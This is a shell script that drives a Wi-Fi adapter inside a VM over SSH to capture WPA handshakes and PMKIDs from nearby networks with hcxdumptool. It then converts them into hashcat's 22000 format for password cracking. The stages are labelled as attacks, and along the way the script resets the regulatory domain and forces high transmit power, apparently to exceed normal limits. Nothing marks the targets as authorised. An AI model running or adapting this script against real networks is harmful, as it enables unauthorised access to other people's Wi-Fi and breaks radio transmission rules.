#!/bin/sh
# Sprint: fire the instant the adapter reaches the guest, before it dies.
VMSSH="ssh -i /Users/tongbao/.ssh/vm_tongbao -p 2222 -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=6 root@127.0.0.1"
R=/tmp/sprint_result.txt
echo "SPRINT2 armed $(date +%H:%M:%S)" > $R
i=0
while [ $i -lt 900 ]; do
  i=$((i+1))
  phy=$(sudo $VMSSH 'ls /sys/class/ieee80211/ 2>/dev/null' 2>/dev/null)
  if [ -n "$phy" ]; then
    echo "PHY_UP $phy at $(date +%H:%M:%S)" >> $R
    break
  fi
  sleep 2
done
[ -z "$phy" ] && { echo "NO_PHY_30MIN" >> $R; exit 0; }
sudo $VMSSH 'iw reg set TW; sleep 1; iw reg get | sed -n 2p; iw dev wlan0 set txpower fixed 1000 2>/dev/null; echo TXSET' >> $R 2>&1
echo "RC36B_START $(date +%H:%M:%S)" >> $R
sudo $VMSSH 'timeout 22 hcxdumptool -i wlan0 -c 36b --rcascan=active 2>&1 | grep -aE "PROBERESPONSE|BEACON|received|failed|ERROR" | tail -6' >> $R 2>&1
echo "ATK1_START $(date +%H:%M:%S)" >> $R
sudo $VMSSH 'iw dev wlan0 set txpower fixed 3000 2>/dev/null; timeout 30 hcxdumptool -i wlan0 -c 1a -w /tmp/sp1.pcapng -t 3 --rds=1 2>&1 | tail -3; hcxpcapngtool --all -o /tmp/sp.22000 /tmp/sp1.pcapng* 2>/dev/null; echo "SP1: PMKID=$(grep -c PMKID /tmp/sp.22000 2>/dev/null) HS=$(grep -c "^WPA\*2" /tmp/sp.22000 2>/dev/null) E=$(grep -c "^WPA\*1" /tmp/sp.22000 2>/dev/null)"' >> $R 2>&1
echo "ATK36B2_START $(date +%H:%M:%S)" >> $R
sudo $VMSSH 'iw dev wlan0 set txpower fixed 1000 2>/dev/null; timeout 30 hcxdumptool -i wlan0 -c 36b -w /tmp/sp36.pcapng -t 3 --rds=1 2>&1 | tail -3; hcxpcapngtool --all -o /tmp/sp36.22000 /tmp/sp36.pcapng* 2>/dev/null; echo "SP36: PMKID=$(grep -c PMKID /tmp/sp36.22000 2>/dev/null) HS=$(grep -c "^WPA\*2" /tmp/sp36.22000 2>/dev/null) E=$(grep -c "^WPA\*1" /tmp/sp36.22000 2>/dev/null)"' >> $R 2>&1
echo "SPRINT_DONE $(date +%H:%M:%S)" >> $R
